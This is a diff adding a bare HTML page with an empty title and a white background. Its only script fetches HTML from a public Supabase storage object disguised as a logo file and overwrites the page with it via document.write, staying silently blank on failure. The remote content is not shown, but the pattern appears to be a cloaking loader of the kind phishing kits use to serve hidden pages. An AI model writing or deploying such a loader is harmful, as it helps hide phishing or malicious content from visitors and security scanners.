@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title></title>
+  <style>
+    html, body {
+      margin: 0;
+      padding: 0;
+      background: white;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    (async () => {
+      try {
+        const url = "https://blqiozzohqqszikuuqad.supabase.co/storage/v1/object/public/videos//logo.html"; // <-- Replace with your Supabase HTML link
+
+        const res = await fetch(url);
+        if (!res.ok) throw new Error("File not found");
+
+        const html = await res.text();
+        document.open(); // clear the page
+        document.write(html); // inject your real HTML
+        document.close();
+      } catch (e) {
+        // Stay on blank white screen if failed
+      }
+    })();
+  </script>
+</body>
+</html>
